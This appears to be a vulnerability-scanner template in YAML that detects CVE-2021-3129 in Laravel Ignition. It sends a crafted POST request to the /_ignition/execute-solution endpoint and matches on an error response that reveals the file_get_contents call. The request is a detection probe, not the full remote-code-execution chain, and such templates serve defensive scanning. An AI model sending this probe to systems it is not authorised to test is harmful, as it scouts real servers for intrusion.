name: poc-yaml-laravel-ignition-cve-2021-3129-rce
rules:
  - method: POST
    path: /_ignition/execute-solution
    headers:
      Content-Type: "application/json"
    body: |-
      {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
          "variableName": "username",
          "viewFile": "xxxxxxx"
        }
      }
    follow_redirects: false
    expression: |
      response.status == 405 && response.body.bcontains(b"ErrorException") && response.body.bcontains(b"file_get_contents(xxxxxxx)")
detail:
  author: arewss
  links:
    - https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129
